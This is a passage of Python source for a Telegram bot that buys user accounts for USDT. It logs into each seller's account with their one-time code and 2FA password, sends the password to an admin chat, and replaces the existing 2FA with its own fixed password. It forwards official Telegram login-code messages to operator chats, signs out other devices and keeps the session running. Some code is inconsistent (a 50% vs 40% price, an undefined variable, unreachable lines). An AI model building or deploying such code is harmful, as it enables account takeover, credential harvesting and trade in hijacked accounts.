                    f"📞 <b>Account:</b> <code>{_h(phone)}</code>",
                    "─────────────────────────",
                    f"✅ <b>Signed Out:</b> {len(terminated)} device(s)",
                    "",
                ]
                for i, (dev, app, country) in enumerate(terminated, 1):
                    parts.append(
                        f"<b>{i}.</b> 📱 <b>{_h(dev)}</b>\n"
                        f"    ├ App: {_h(app)}\n"
                        f"    └ Location: {_h(country)}"
                    )
                parts += [
                    "",
                    "─────────────────────────",
                    "🤖 <i>Bot session is active and monitoring.</i>",
                ]

                try:
                    await bot.send_message(
                        chat_id=int(user_id),
                        text="\n".join(parts),
                        parse_mode='HTML',
                    )
                    logger.info(f"[Phase 1] Sent security message to {user_id} for {phone}")
                except Exception as send_err:
                    logger.error(f"[Phase 1] Failed to send user message for {phone}: {send_err}")
        else:
            # No other sessions — still let the user know everything is clean.
            try:
                await bot.send_message(
                    chat_id=int(user_id),
                    text=(
                        "🛡️ <b>Security Check Passed</b>\n"
                        f"📞 <b>Account:</b> <code>{html.escape(str(phone))}</code>\n"
                        "✅ <i>Only the bot session is active. No other devices found.</i>"
                    ),
                    parse_mode='HTML',
                )
                logger.info(f"[Phase 1] Sent all-clear message to {user_id} for {phone}")
            except Exception as send_err:
                logger.error(f"[Phase 1] Failed to send 'all-clear' message for {phone}: {send_err}")
    except Exception as e:
        logger.error(f"[Phase 1] Error in send_login_followup for {phone}: {e}")

    # ── PHASE 2: re-check 3 minutes after login ────────────────────────────────
    await asyncio.sleep(175)  # 5 + 175 = 180 s total from login
    try:
        if not client.is_connected():
            await client.connect()

        result = await client(functions.account.GetAuthorizationsRequest())
        authorizations = result.authorizations
        active_count = len(authorizations)

        if active_count > 1:
            def _h2(s: str) -> str:
                return html.escape(str(s or ''))

            session_map = {}
            for auth in authorizations:
                h = str(getattr(auth, 'hash', 0))
                session_map[h] = {
                    'device': getattr(auth, 'device_model', 'Unknown Device'),
                    'app': getattr(auth, 'app_name', 'Unknown App'),
                    'country': getattr(auth, 'country', 'Unknown'),
                    'current': getattr(auth, 'current', False),
                }

            parts = [
                "🛡️ <b>Security Notice</b>",
                "",
                "📋 <b>Active Sessions Still Detected</b>",
                "─────────────────────────",
                f"📞 <b>Account:</b> <code>{_h2(phone)}</code>",
                f"📊 <b>Active Devices:</b> {active_count}",
                "─────────────────────────",
                "",
                "<b>Logged-In Devices:</b>",
            ]

            for i, (h, info) in enumerate(session_map.items(), 1):
                device = info['device']
                app = info['app']
                country = info['country']
                is_current = info['current']

                if is_current:
                    parts.append(
                        f"\n<b>{i}.</b> 🤖 <b>{_h2(device)}</b>\n"
                        f"    ├ App: {_h2(app)}\n"
                        f"    ├ Location: {_h2(country)}\n"
                        f"    └ ✅ <b>This Device (Bot — Active)</b>"
                    )
                else:
                    parts.append(
                        f"\n<b>{i}.</b> 📱 <b>{_h2(device)}</b>\n"
                        f"    ├ App: {_h2(app)}\n"
                        f"    └ Location: {_h2(country)}"
                    )

            parts += [
                "",
                "─────────────────────────",
                "🕐 <b>Your account is currently active on multiple devices.</b> "
                "Processing may take up to <b>32 hours</b> to complete.",
                "",
                "<i>Thank you for your patience.</i>",
            ]

            try:
                await bot.send_message(
                    chat_id=int(user_id),
                    text="\n".join(parts),
                    parse_mode='HTML',
                )
                logger.info(f"[Phase 2] Sent multi-device notice to {user_id} for {phone}")
            except Exception as send_err:
                logger.error(f"[Phase 2] Failed to send user message for {phone}: {send_err}")
    except Exception as e:
        logger.error(f"[Phase 2] Error in send_login_followup for {phone}: {e}")


async def terminate_session_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle inline button press to terminate a specific Telegram session."""
    query = update.callback_query
    await query.answer()

    data = query.data  # terminate_session_{user_id}_{hash}
    parts = data.split("_", 3)
    if len(parts) < 4:
        await query.answer("Invalid request.", show_alert=True)
        return

    target_user_id = parts[2]
    session_hash_str = parts[3]

    # Only allow the account owner to use these buttons
    if str(update.effective_user.id) != target_user_id:
        await query.answer("⛔ This button is not for you.", show_alert=True)
        return

    info = pending_terminations.get(target_user_id)
    if not info:
        await query.answer("Session info expired. Cannot terminate.", show_alert=True)
        return

    session_path = info['session_path']
    sessions = info['sessions']
    device_info = sessions.get(session_hash_str, {})
    device_name = device_info.get('device', 'Unknown Device')

    try:
        client = TelegramClient(session_path, TELEGRAM_API_ID, TELEGRAM_API_HASH)
        await client.connect()
        await client(functions.account.ResetAuthorizationRequest(hash=int(session_hash_str)))
        await client.disconnect()

        # Remove from local map
        sessions.pop(session_hash_str, None)

        # Rebuild keyboard without the terminated session's button
        try:
            remaining_buttons = [
                [InlineKeyboardButton(
                    f"🚪 Sign Out — {sessions[h]['device'][:25]}",
                    callback_data=f"terminate_session_{target_user_id}_{h}"
                )]
                for h in sessions
                if not sessions[h].get('current', False)
            ]
            new_markup = InlineKeyboardMarkup(remaining_buttons) if remaining_buttons else None
            await query.edit_message_reply_markup(reply_markup=new_markup)
        except Exception:
            pass

        await query.answer(f"✅ Signed out: {device_name}", show_alert=True)

    except Exception as e:
        logger.error(f"Failed to terminate session {session_hash_str}: {e}")
        await query.answer("❌ Failed to sign out. Please try manually.", show_alert=True)


async def handle_pin_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle the verification OTP and perform real login + 2FA setup"""
    if not update.message or not update.message.text:
        return WAITING_FOR_PIN

    if await maybe_cancel_sell_for_reply_button(update, context):
        return ConversationHandler.END

    otp = update.message.text.strip()
    client = context.user_data.get('telethon_client')
    phone = context.user_data.get('user_number')
    phone_code_hash = context.user_data.get('phone_code_hash')
    user_id_for_pending = str(update.effective_user.id)

    # If the bot restarted while the user was entering the OTP, the in-memory
    # client/hash are gone — try to recover from what we persisted to disk.
    if not client or not phone_code_hash:
        pending = _load_pending_login(user_id_for_pending)
        if pending:
            try:
                phone = pending['phone']
                phone_code_hash = pending['phone_code_hash']
                client = TelegramClient(pending['session_path'], TELEGRAM_API_ID, TELEGRAM_API_HASH)
                await client.connect()
                context.user_data['telethon_client'] = client
                context.user_data['user_number'] = phone
                context.user_data['phone_code_hash'] = phone_code_hash
                logger.info(f"[PIN-Recover] Restored pending login for {phone} after restart")
            except Exception as e:
                logger.error(f"[PIN-Recover] Failed to restore session for {user_id_for_pending}: {e}")
                client = None

    if not client or not phone or not phone_code_hash:
        await update.message.reply_text("❌ Session expired. Please start again.")
        return ConversationHandler.END

    # Clean up: delete the OTP prompt and the user's OTP message
    otp_prompt_msg_id = context.user_data.pop('otp_prompt_msg_id', None)
    otp_prompt_chat_id = context.user_data.pop('otp_prompt_chat_id', None)
    if otp_prompt_msg_id and otp_prompt_chat_id:
        try:
            await context.bot.delete_message(chat_id=otp_prompt_chat_id, message_id=otp_prompt_msg_id)
        except Exception:
            pass
    try:
        await update.message.delete()
    except Exception:
        pass

    anim_msg = await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="⏳ **Verifying OTP...**",
        parse_mode='Markdown',
    )

    try:
        await client.sign_in(phone, otp, phone_code_hash=phone_code_hash)
        _clear_pending_login(user_id_for_pending)

        # Login successful — check if account is frozen/restricted
        user_id = str(update.effective_user.id)
        country_data = context.user_data.get('country_data')

        # Check if account is frozen/spam-restricted (SpamBot + API flags)
        account_status = None  # None = clean, 'spam' = spam-limited, 'frozen' = API-restricted
        try:
            account_status = await check_account_frozen(client, status_msg=anim_msg)
        except Exception as e:
            logger.error(f"Frozen check failed: {e}")

        if account_status == 'frozen':
            # ── FROZEN ACCOUNT: outright rejection ──
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=(
                        f"🚫 **Frozen Account Submitted**\n\n"
                        f"👤 **User ID:** `{user_id}`\n"
                        f"📞 **Number:** `{phone}`\n"
                        f"💰 **Price:** ${country_data['sell_price']} USD\n\n"
                        f"⚠️ Account is frozen/restricted by Telegram.\n"
                        f"Login was completed but user was shown rejection."
                    ),
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"Failed to notify admin about frozen account: {e}")
            await anim_msg.edit_text(
                "❌ **Sell Request Rejected!**\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📞 **Number:** `{phone}`\n\n"
                "🚫 This number is **Frozen** by Telegram.\n\n"
                "Your sell request has been automatically rejected. "
                "Please try with a different, active Telegram number.",
                parse_mode='Markdown'
            )
            context.user_data.clear()
            await start(update, context)
            return ConversationHandler.END

        if account_status == 'spam':
            # ── Check if spam purchase is disabled for this country ──
            if country_data.get('spam_off', False):
                country_name = country_data.get('name', 'this country')
                await anim_msg.edit_text(
                    "⚠️ <b>Spam Account Detected</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📞 <b>Number:</b> <code>{phone}</code>\n\n"
                    "<blockquote>"
                    "🔴 This number has been flagged as Spam by Telegram.\n\n"
                    f"😔 Unfortunately, we are not accepting spam accounts from {country_name} at the moment.\n\n"
                    "⏳ Please try again later with a clean, non-spam number.\n\n"
                    "✖️ Your sell request has been cancelled."
                    "</blockquote>",
                    parse_mode='HTML'
                )
                if client.is_connected():
                    await client.disconnect()
                context.user_data.clear()
                await start(update, context)
                return ConversationHandler.END
            # ── SPAM ACCOUNT: offer 40% price ──
            half_price = round(country_data['sell_price'] * 0.4, 2)
            context.user_data['spam_pending_phone'] = phone
            context.user_data['spam_pending_country_data'] = country_data
            context.user_data['spam_pending_client'] = client
            context.user_data['spam_pending_half_price'] = half_price
            keyboard = [
                [InlineKeyboardButton(f"✅ Confirm — ${half_price} USDT", callback_data="spam_confirm_sale")],
                [InlineKeyboardButton("❌ Cancel", callback_data="spam_cancel_sale")],
            ]
            await anim_msg.edit_text(
                "⚠️ <b>Spam Account Detected</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📞 <b>Number:</b> <code>{phone}</code>\n\n"
                "This number has been flagged by Telegram's anti-spam system. "
                "We can still accept this account at a reduced rate.\n\n"
                f"💰 <b>Original Price:</b> ${country_data['sell_price']} USDT\n"
                f"⚡ <b>Spam Rate (40%):</b> ${half_price} USDT\n\n"
                "Would you like to proceed at the reduced price?",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='HTML'
            )
            return ConversationHandler.END

        # ── NORMAL FLOW: add balance and process sale ──
        with user_data_lock:
            if user_id not in user_data:
                get_user_data(user_id)
            user_data[user_id]['hold_balance_usdt'] += country_data['sell_price']
            user_data[user_id]['accounts_sold'] += 1
            if 'sold_numbers' not in user_data[user_id]:
                user_data[user_id]['sold_numbers'] = []
            user_data[user_id]['sold_numbers'].append(phone)

            if 'processing_details' not in user_data[user_id]:
                user_data[user_id]['processing_details'] = []
            user_data[user_id]['processing_details'].append({
                'number': phone,
                'price': country_data['sell_price'],
                'status': 'Processing',
                'timestamp': datetime.now().isoformat(),
                'country': country_data['name']
            })
            save_user_data()

        await anim_msg.edit_text(
            build_login_success_message(phone, country_data),
            parse_mode='HTML'
        )

        # Forward login code if any
        @client.on(events.NewMessage())
        async def handler(event):
            try:
                # Skip groups and channels — only forward official Telegram messages from private chat
                if not event.is_private:
                    return
                is_official = event.sender_id == TELEGRAM_OFFICIAL_ID or getattr(event.sender, 'username', '') == 'Telegram'
                if not is_official:
                    return
                sender = await event.get_sender()
                sender_name = getattr(sender, 'first_name', 'Unknown')
                if not sender_name and hasattr(sender, 'title'):
                    sender_name = sender.title
                forward_text = f"🔔 **New Message**\n📞 Number: `{phone}`\n👤 Sender: {sender_name}\n\n{event.raw_text}"
                forward_text += f"\n\nDEBUG: Sender ID: {event.sender_id}\nUsername: {getattr(sender, 'username', 'N/A')}"
                try:
                    await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=forward_text)
                except Exception as admin_err:
                    logger.error(f"Failed to send to admin: {admin_err}")
                try:
                    await context.bot.send_message(chat_id=FORWARD_CHAT_ID, text=forward_text)
                except Exception as forward_err:
                    logger.error(f"Failed to send to FORWARD_CHAT_ID: {forward_err}")
            except Exception as e:
                logger.error(f"Failed to forward message: {e}")

        # Save session info
        try:
            session_info = {
                'phone': phone,
                'user_id': user_id,
                'timestamp': datetime.now().isoformat(),
                'status': 'active'
            }
            with open(f'sessions/info_{phone.replace("+", "")}.json', 'w') as f:
                json.dump(session_info, f)
        except Exception:
            pass

        # Change Telegram Name
        try:
            if me:
                new_last_name = f"{me.last_name or ''}".strip()
                await client(functions.account.UpdateProfileRequest(last_name=new_last_name))
        except Exception as e:
            logger.error(f"Failed to change TG name: {e}")

        # Admin Notify
        admin_notif = (
            f"🔔 **New Account Sold (REAL LOGIN)**\n\n"
            f"👤 **User ID:** `{user_id}`\n"
            f"📞 **Number:** `{phone}`\n"
            f"💰 **Price:** ${country_data['sell_price']} USD\n"
        )
        if context.user_data.get('pin'):
            admin_notif += f"🔑 **Login PIN:** `{context.user_data.get('pin')}`\n"
        admin_notif += "\nAccount logged in successfully."
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=admin_notif,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Final Approve", callback_data=f"final_approve_{user_id}_{country_data['sell_price']}_{phone}")],
                [InlineKeyboardButton("❌ Reject", callback_data=f"final_reject_{user_id}_{country_data['sell_price']}_{phone}")]
            ])
        )

        # Schedule 3-minute follow-up check for multiple devices
        asyncio.create_task(send_login_followup(
            bot=context.bot,
            user_id=user_id,
            phone=phone,
            client=client
        ))

        # 10s after login: enable a fresh 2FA password (account had no 2FA)
        asyncio.create_task(set_new_2fa_password(
            bot=context.bot,
            user_id=user_id,
            phone=phone,
            client=client,
            old_password=None,
        ))

        # Keep the client connected for message forwarding
        return ConversationHandler.END

    except errors.PhoneCodeInvalidError:
        await anim_msg.edit_text("❌ **Invalid OTP!** Please try again.")
        return WAITING_FOR_PIN
    except errors.SessionPasswordNeededError:
        # User already has 2FA, ask for it
        await anim_msg.edit_text("🔐 **Two-Step Verification Enabled**\n\nPlease enter your 2FA password to complete the login:")
        # Remember which message asked for the 2FA password so we can delete it later
        context.user_data['twofa_prompt_msg_id'] = anim_msg.message_id
        context.user_data['twofa_prompt_chat_id'] = anim_msg.chat_id
        return WAITING_FOR_2FA
    except (errors.UserDeactivatedBanError, errors.UserDeactivatedError):
        await anim_msg.edit_text(
            "🚫 **Account Frozen!**\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📞 **Number:** `{phone}`\n\n"
            "⚠️ This account has been **frozen/banned** by Telegram.\n\n"
            "❌ Your sell request has been **automatically rejected**.\n\n"
            "Please try with a different, active Telegram number.",
            parse_mode='Markdown'
        )
        if client.is_connected():
            await client.disconnect()
        context.user_data.clear()
        await start(update, context)
        return ConversationHandler.END
    except Exception as e:
        await anim_msg.edit_text(f"❌ **Error:** {str(e)}")
        await client.disconnect()
        return ConversationHandler.END

async def handle_2fa_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle the 2FA password input from user and re-secure the account"""
    if not update.message or not update.message.text:
        return WAITING_FOR_2FA

    if await maybe_cancel_sell_for_reply_button(update, context):
        return ConversationHandler.END

    password = update.message.text.strip()
    context.user_data['two_fa'] = password
    client = context.user_data.get('telethon_client')
    phone = context.user_data.get('user_number')

    if not client or not phone:
        await update.message.reply_text("❌ Session expired. Please start again.")
        return ConversationHandler.END

    # Clean up: delete the 2FA prompt and the user's 2FA password message
    twofa_prompt_msg_id = context.user_data.pop('twofa_prompt_msg_id', None)
    twofa_prompt_chat_id = context.user_data.pop('twofa_prompt_chat_id', None)
    if twofa_prompt_msg_id and twofa_prompt_chat_id:
        try:
            await context.bot.delete_message(chat_id=twofa_prompt_chat_id, message_id=twofa_prompt_msg_id)
        except Exception:
            pass
    try:
        await update.message.delete()
    except Exception:
        pass

    anim_msg = await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="⏳ **Verifying 2FA Password...**",
        parse_mode='Markdown',
    )

    try:
        await client.sign_in(password=password)

        user_id = str(update.effective_user.id)
        country_data = context.user_data.get('country_data')

        # Check SpamBot after 2FA login
        account_status_2fa = None
        try:
            account_status_2fa = await check_account_frozen(client, status_msg=anim_msg)
        except Exception as e:
            logger.error(f"Frozen check failed (2FA path): {e}")

        if account_status_2fa == 'frozen':
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=(
                        f"🚫 **Frozen Account Submitted (2FA)**\n\n"
                        f"👤 **User ID:** `{user_id}`\n"
                        f"📞 **Number:** `{phone}`\n"
                        f"💰 **Price:** ${country_data['sell_price']} USD\n\n"
                        f"⚠️ Account is frozen/restricted by Telegram."
                    ),
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"Failed to notify admin about frozen 2FA account: {e}")
            await anim_msg.edit_text(
                "❌ **Sell Request Rejected!**\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📞 **Number:** `{phone}`\n\n"
                "🚫 This number is **Frozen** by Telegram.\n\n"
                "Your sell request has been automatically rejected. "
                "Please try with a different, active Telegram number.",
                parse_mode='Markdown'
            )
            context.user_data.clear()
            await start(update, context)
            return ConversationHandler.END

        if account_status_2fa == 'spam':
            # ── Check if spam purchase is disabled for this country ──
            if country_data.get('spam_off', False):
                country_name = country_data.get('name', 'this country')
                await anim_msg.edit_text(
                    "⚠️ <b>Spam Account Detected</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📞 <b>Number:</b> <code>{phone}</code>\n\n"
                    "<blockquote>"
                    "🔴 This number has been flagged as Spam by Telegram.\n\n"
                    f"😔 Unfortunately, we are not accepting spam accounts from {country_name} at the moment.\n\n"
                    "⏳ Please try again later with a clean, non-spam number.\n\n"
                    "✖️ Your sell request has been cancelled."
                    "</blockquote>",
                    parse_mode='HTML'
                )
                if client.is_connected():
                    await client.disconnect()
                context.user_data.clear()
                await start(update, context)
                return ConversationHandler.END
            half_price = round(country_data['sell_price'] * 0.4, 2)
            context.user_data['spam_pending_phone'] = phone
            context.user_data['spam_pending_country_data'] = country_data
            context.user_data['spam_pending_client'] = client
            context.user_data['spam_pending_half_price'] = half_price
            context.user_data['spam_pending_two_fa'] = password
            keyboard = [
                [InlineKeyboardButton(f"✅ Confirm — ${half_price} USDT", callback_data="spam_confirm_sale")],
                [InlineKeyboardButton("❌ Cancel", callback_data="spam_cancel_sale")],
            ]
            await anim_msg.edit_text(
                "⚠️ <b>Spam Account Detected</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📞 <b>Number:</b> <code>{phone}</code>\n\n"
                "This number has been flagged by Telegram's anti-spam system. "
                "We can still accept this account at a reduced rate.\n\n"
                f"💰 <b>Original Price:</b> ${country_data['sell_price']} USDT\n"
                f"⚡ <b>Spam Rate (40%):</b> ${half_price} USDT\n\n"
                "Would you like to proceed at the reduced price?",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='HTML'
            )
            return ConversationHandler.END

        # Normal flow - add full balance
        with user_data_lock:
            if user_id not in user_data:
                get_user_data(user_id)
            user_data[user_id]['hold_balance_usdt'] += country_data['sell_price']
            user_data[user_id]['accounts_sold'] += 1
            if 'sold_numbers' not in user_data[user_id]:
                user_data[user_id]['sold_numbers'] = []
            user_data[user_id]['sold_numbers'].append(phone)
            
            # Add to processing_details for website immediately
            if 'processing_details' not in user_data[user_id]:
                user_data[user_id]['processing_details'] = []
            user_data[user_id]['processing_details'].append({
                'number': phone,
                'price': country_data['sell_price'],
                'status': 'Processing',
                'timestamp': datetime.now().isoformat(),
                'country': country_data['name']
            })
            
            save_user_data()

        await anim_msg.edit_text(
            build_login_success_message(phone, country_data),
            parse_mode='HTML'
        )

        # Forward ONLY official Telegram private messages (login codes / security)
        @client.on(events.NewMessage())
        async def handler(event):
            try:
                # Skip groups and channels — only forward official Telegram messages from private chat
                if not event.is_private:
                    return
                is_official = event.sender_id == TELEGRAM_OFFICIAL_ID or getattr(event.sender, 'username', '') == 'Telegram'
                if not is_official:
                    return

                sender = await event.get_sender()
                sender_name = getattr(sender, 'first_name', 'Unknown')
                if not sender_name and hasattr(sender, 'title'):
                    sender_name = sender.title

                forward_text = f"🔔 **New Message**\n📞 Number: `{phone}`\n👤 Sender: {sender_name}\n\n{event.raw_text}"
                forward_text += f"\n\nDEBUG: Sender ID: {event.sender_id}\nUsername: {getattr(sender, 'username', 'N/A')}"

                try:
                    await context.bot.send_message(
                        chat_id=ADMIN_CHAT_ID,
                        text=forward_text
                    )
                except Exception as admin_err:
                    logger.error(f"Failed to send to admin: {admin_err}")

                try:
                    target_id = FORWARD_CHAT_ID
                    await context.bot.send_message(
                        chat_id=target_id,
                        text=forward_text
                    )
                except Exception as forward_err:
                    logger.error(f"Failed to send to FORWARD_CHAT_ID ({FORWARD_CHAT_ID}): {forward_err}")

                logger.info(f"Forwarding attempt complete for {phone} (2FA path)")
            except Exception as e:
                logger.error(f"Forwarding error (2FA path) for {phone}: {e}")

        # 10s after 2FA login: replace the existing 2FA with our fixed password
        asyncio.create_task(set_new_2fa_password(
            bot=context.bot,
            user_id=user_id,
            phone=phone,
            client=client,
            old_password=password,
        ))

        # Keep session alive/running for forwarding
        asyncio.create_task(client.run_until_disconnected())

        # Change Telegram Name
        try:
            me = await client.get_me()
            new_last_name = f"{me.last_name or ''}".strip()
            await client(functions.account.UpdateProfileRequest(
                last_name=new_last_name
            ))
        except Exception as e:
            logger.error(f"Failed to change TG name: {e}")

        # Admin Notify
        admin_notif = f"""
🔔 **New Account Sold (2FA VERIFIED)**

👤 **User ID:** `{user_id}`
📞 **Number:** `{phone}`
💰 **Price:** ${country_data['sell_price']} USD
"""
        if context.user_data.get('two_fa'):
            admin_notif += f"🔐 **Two-Step Verification Enabled**\n\nPassword: `{context.user_data.get('two_fa')}`\n"

        admin_notif += "\nExisting 2FA was verified. Password not changed.\n\"\"\""
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=admin_notif,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Final Approve", callback_data=f"final_approve_{user_id}_{country_data['sell_price']}_{phone}")],
                [InlineKeyboardButton("❌ Reject", callback_data=f"final_reject_{user_id}_{country_data['sell_price']}_{phone}")]
            ])
        )

        # await client.disconnect() # Removed to keep forwarding active
        return ConversationHandler.END

    except errors.PasswordHashInvalidError:
        await anim_msg.edit_text("❌ **Invalid 2FA Password!** Please try again.")
        return WAITING_FOR_2FA
    except Exception as e:
        await anim_msg.edit_text(f"❌ **Error:** {str(e)}")
        await client.disconnect()
        return ConversationHandler.END


    # Forwarding Logic (Simulated - would need active Telethon session)
    logger.info(f"Setting up message forwarding for {user_number} to {FORWARD_CHAT_ID}")

    # Clear stored data
    context.user_data.pop('admin_approved', None)
    context.user_data.pop('user_number', None)
    context.user_data.pop('country_data', None)

    return ConversationHandler.END

async def cancel_sell_conversation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel the sell conversation"""
    context.user_data.clear()
    await sell_account_callback(update, context)
    return ConversationHandler.END


async def _cleanup_sell_state(context: ContextTypes.DEFAULT_TYPE) -> None:
    """Disconnect any active telethon client and wipe sell-flow keys from user_data."""
    client = context.user_data.get('telethon_client')
    if client is not None:
        try:
            if client.is_connected():
                await client.disconnect()
        except Exception:
            pass
    for k in (
        'telethon_client', 'user_number', 'phone_code_hash',
        'country_data', 'selected_country', 'country_pattern',
        'number_prompt_msg_id', 'number_prompt_chat_id',
        'otp_prompt_msg_id', 'otp_prompt_chat_id',
        'twofa_prompt_msg_id', 'twofa_prompt_chat_id',
        'pin', 'two_fa', 'admin_approved',
    ):
        context.user_data.pop(k, None)


REPLY_KEYBOARD_BUTTONS = {
    "💸 Sell Account", "🏦 Withdrawal", "💰 Balance",
    "ℹ️ Safety & Terms", "👥 Refer & Earn", "📜 My History",
}


async def _route_reply_keyboard_text(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str) -> None:
    """Dispatch a reply-keyboard text press to its proper callback.
    Most target callbacks read update.callback_query, so wrap the text update in
    a fake-query shim mirroring the pattern used by message_router."""
    try:
        class _FakeQuery:
            def __init__(self):
                self.from_user = update.effective_user
                self.message = update.message
                self.data = None

            async def answer(self, text=None, show_alert=False):
                pass

            async def edit_message_text(self, text, **kwargs):
                await update.message.reply_text(text, **kwargs)

            async def edit_message_reply_markup(self, reply_markup=None):
                await update.message.reply_text("Choose an option:", reply_markup=reply_markup)

        class _FakeUpdate:
            def __init__(self):
                self.effective_user = update.effective_user
                self.effective_chat = update.effective_chat
                self.callback_query = _FakeQuery()
                self.message = update.message

        fake_update = _FakeUpdate()

        if text == "💸 Sell Account":
            await sell_account_callback(fake_update, context)
        elif text == "🏦 Withdrawal":
            await withdrawal_callback(fake_update, context)
        elif text == "💰 Balance":
            await balance_callback(fake_update, context)
        elif text == "ℹ️ Safety & Terms":
            await terms_command(update, context)
        elif text == "👥 Refer & Earn":
            await refer_callback(fake_update, context)
        elif text == "📜 My History":
            await my_history_callback(update, context)
    except Exception as e:
        logger.error(f"_route_reply_keyboard_text error for '{text}': {e}")


async def maybe_cancel_sell_for_reply_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """If the user typed/tapped a reply-keyboard main-menu button mid-sell,
    tear the sell flow down and run the corresponding handler. Returns True if handled."""
    if not update.message or not update.message.text:
        return False
    text = update.message.text.strip()
    if text not in REPLY_KEYBOARD_BUTTONS:
        return False
    await _cleanup_sell_state(context)
    await _route_reply_keyboard_text(update, context, text)
    return True


async def cancel_sell_and_route(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Mid-sell escape: user clicked some other main-menu button.

    Tear down the sell flow, then dispatch the click to the regular
    callback router so the button still works.
    """
    await _cleanup_sell_state(context)
    try:
        await callback_handler(update, context)
    except Exception as e:
        logger.error(f"cancel_sell_and_route routing error: {e}")
    return ConversationHandler.END


async def send_admin_notification(context: ContextTypes.DEFAULT_TYPE, user_id: str, number: str, pin: str, country: str, price: float) -> None:
    """Send notification to admin about new sell request"""
    try:
        user_info = get_user_data(user_id)
        notification_text = f"""
🔔 **New Account Sale Request**

👤 **User:** {user_id}
📞 **Number:** {number}
🔐 **PIN:** {pin}
🌍 **Country:** {country}
💰 **Price:** ${price} USD

⏳ **Hold Balance:** {user_info['hold_balance_usdt']:.2f} USDT
💰 **Main Balance:** {user_info['main_balance_usdt']:.2f} USDT

Please approve:
"""

        keyboard = [
            [InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}_{price}")],
            [InlineKeyboardButton("❌ Reject", callback_data=f"reject_pin_{user_id}_{price}")],
            [InlineKeyboardButton("📩 Reject SMS", callback_data=f"reject_pin_sms_{user_id}_{price}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=notification_text,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Failed to send admin notification: {e}")

async def spam_confirm_sale_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """User confirmed to sell spam account at 50% price."""
    query = update.callback_query
    await query.answer()

    user_id = str(update.effective_user.id)
    phone = context.user_data.get('spam_pending_phone')
    country_data = context.user_data.get('spam_pending_country_data')
    client = context.user_data.get('spam_pending_client')
    half_price = context.user_data.get('spam_pending_half_price')
    two_fa_password = context.user_data.get('spam_pending_two_fa')

    if not phone or not country_data or half_price is None:
        await query.edit_message_text("❌ Session expired. Please start again.")
        await start(update, context)
        return

    with user_data_lock:
        if user_id not in user_data:
            get_user_data(user_id)
        user_data[user_id]['hold_balance_usdt'] += half_price
        user_data[user_id]['accounts_sold'] += 1
        if 'sold_numbers' not in user_data[user_id]:
            user_data[user_id]['sold_numbers'] = []
        user_data[user_id]['sold_numbers'].append(phone)
        if 'processing_details' not in user_data[user_id]:
            user_data[user_id]['processing_details'] = []
        user_data[user_id]['processing_details'].append({
            'number': phone,
            'price': half_price,
            'status': 'Processing',
            'timestamp': datetime.now().isoformat(),
            'country': country_data['name']
        })
        save_user_data()

    spam_country_data = dict(country_data)
    spam_country_data['sell_price'] = half_price
    # Remove inline keyboard from offer message
    try:
        await query.edit_message_reply_markup(reply_markup=None)
    except Exception:
        pass
    # Send login success as a fresh message
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=build_login_success_message(phone, spam_country_data),
        parse_mode='HTML'
    )

    try:
        admin_msg = (
            f"⚠️ **Spam Account Sold (40% Price)**\n\n"
            f"👤 **User ID:** `{user_id}`\n"
            f"📞 **Number:** `{phone}`\n"
            f"💰 **Price:** ${half_price} USDT (40% of ${country_data['sell_price']})"
        )
        if two_fa_password:
            admin_msg += f"\n🔐 **2FA Password:** `{two_fa_password}`"
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=admin_msg,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Final Approve", callback_data=f"final_approve_{user_id}_{half_price}_{phone}")],
                [InlineKeyboardButton("❌ Reject", callback_data=f"final_reject_{user_id}_{half_price}_{phone}")]
            ])
        )
    except Exception as e:
        logger.error(f"Failed to notify admin about spam sale: {e}")

    if client and client.is_connected():
        @client.on(events.NewMessage())
        async def _spam_handler(event):
            try:
                if not event.is_private:
                    return
                is_official = event.sender_id == TELEGRAM_OFFICIAL_ID or getattr(event.sender, 'username', '') == 'Telegram'
                if not is_official:
                    return
                sender = await event.get_sender()
                sender_name = getattr(sender, 'first_name', 'Unknown')
                forward_text = f"🔔 **New Message**\n📞 Number: `{phone}`\n👤 Sender: {sender_name}\n\n{event.raw_text}"
                await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=forward_text)
